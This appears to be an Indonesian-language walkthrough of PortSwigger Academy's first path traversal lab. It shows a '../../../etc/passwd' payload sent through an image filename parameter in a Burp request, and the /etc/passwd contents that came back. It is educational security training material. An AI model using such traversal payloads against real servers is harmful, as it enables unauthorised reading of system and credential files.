# [PortSwigger Academy] Path Traversal - Lab #1

## 📌 Detail Lab
* **Nama Tantangan:** File path traversal, simple case
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** Path Traversal (Directory Traversal)
* **Tujuan Lab:** Membaca isi file sensitif sistem operasi Linux (`/etc/passwd`) melalui parameter pemuatan gambar aplikasi yang rentan.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Ketika menjelajahi halaman utama aplikasi, setiap gambar produk dimuat melalui endpoint khusus dengan parameter nama file, contohnya: `/image?filename=60.jpg`.

Backend aplikasi mengambil file ini secara langsung dari direktori tertentu di server (misalnya: `/var/www/images/60.jpg`). Karena tidak ada validasi atau sanitasi input terhadap karakter navigasi path, kita bisa menyisipkan urutan karakter `../` (*relative path traversal*) untuk naik ke direktori atas (parent directory) hingga mencapai root direktori sistem (`/`), lalu mengarahkannya ke file `/etc/passwd`.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Identifikasi Titik Injeksi (Injection Point)
Gunakan Burp Suite untuk menangkap request saat halaman web memuat gambar produk. Kirim request tersebut ke Burp Repeater.

### Manipulasi Parameter dan Pengiriman Payload
Ubah nilai pada parameter `filename` dari `60.jpg` menjadi payload traversal untuk membaca file konfigurasi user Linux (`/etc/passwd`). Kita gunakan urutan `../` sebanyak 3 atau 4 kali untuk memastikan kita keluar dari folder web server.

* **Payload:** `../../../etc/passwd`

Request HTTP final di Burp Repeater:
```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0ade005a034d1a6f8024bc7d00d200f4.web-security-academy.net
```

### Hasil Eksekusi dan Isi File
Kirim request tersebut. Aplikasi merespons dengan status HTTP 200 OK dan langsung mengembalikan isi dari file /etc/passwd mentah di dalam response body:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```
Hasil Akhir: Karena isi file /etc/passwd berhasil terbaca secara transparan di layar respons Burp Suite, kerentanan terbukti valid dan lab dinyatakan selesai (Solved).